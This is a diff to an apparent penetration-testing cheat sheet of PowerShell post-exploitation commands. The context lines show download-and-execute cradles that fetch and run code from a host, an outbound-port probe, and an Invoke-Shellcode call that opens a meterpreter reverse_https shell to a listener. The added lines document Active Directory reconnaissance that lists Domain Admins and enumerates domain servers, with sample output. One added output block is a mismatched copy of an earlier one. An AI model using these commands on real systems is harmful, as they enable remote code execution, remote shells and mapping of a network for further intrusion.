@@ -25,7 +25,7 @@ iex (New-Object Net.WebClient).DownloadString("http://host/file.txt")
 (new-object System.Net.WebClient).Downloadfile('http://host/file.exe', 'file.exe')
 ```
 
-**Enumerate Allowed Outbound Ports 1-1024**
+**Enumerate Allowed Outbound Ports 1-1024 via [securitypadawan.blogspot.com](http://securitypadawan.blogspot.com/2013/04/quickly-determine-allowed-outbound-ports.html)**
 
 ```
 $ErrorActionPreference = "silentlycontinue"; 1..1024 | % {$req = [System.Net.WebRequest]::Create("http://letmeoutofyour.net:$_"); $req.Timeout = 600; $resp = $req.GetResponse(); $respstream = $resp.GetResponseStream(); 
@@ -64,3 +64,23 @@ Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 
  * **Command with arguments**: `((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-19")).translate([System.Security.Principal.NTAccount])).value`
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> ((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1319606305-3131390644-2280705280-<br>1000")).translate([System.Security.Principal.NTAccount])).value<br>WIN-244VDGE5OGH\johndoe</code></div> 
+   
+ ## Using the PowerShell Active Directory Modules via (https://www.trustedsec.com/uncategorized/powershell-reconnaissance/)
+ ### Setting Credentials 
+ * **Command with arguments**: `$cred = Get-Credential`
+ * **Notes**: These following commands require the Powershell Active Directory Modules to be installed. These can be downloaded for Win7 [here] (http://www.microsoft.com/en-us/download/details.aspx?id=7887)
+ * **Output**:
+   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code>PS C:\Users\johndoe> ((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1319606305-3131390644-2280705280-<br>1000")).translate([System.Security.Principal.NTAccount])).value<br>WIN-244VDGE5OGH\johndoe</code></div> 
+   
+ ### Query to List "Domain Admins" 
+ * **Command with arguments**: `Get-ADGroupMember -Credential $cred -server pwnt.com "Domain Admins"`
+ * **Output**:
+   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code><br>distinguishedName : CN=Administrator,CN=Users,DC=pwnt,DC=com<br>name              : Administrator<br>objectClass       : user<br>objectGUID        : 1fd60ff8-07a4-4c6e-9a1e-7cd0d7bb97db<br>SamAccountName    : Administrator<br>SID               : S-1-5-21-2027135834-1792351174-2509185371-500</code></div> 
+   
+ ### Enumerate All Servers on Domain" 
+ * **Command with arguments**: `Get-ADComputer -Credential $cred -server pwnt.com -LDAPFilter "(&(objectCategory=computer)(opera
+tingSystem=*Server*))" |select name`
+ * **Output**:
+   * <div class="slide" style="cursor: pointer;"> **Windows 7:** Show/Hide</div><div class="view"><code><br>name<br>----<br>PWNT-DC<br>
+Exchange1<br>
+SharePoint1</code></div> 
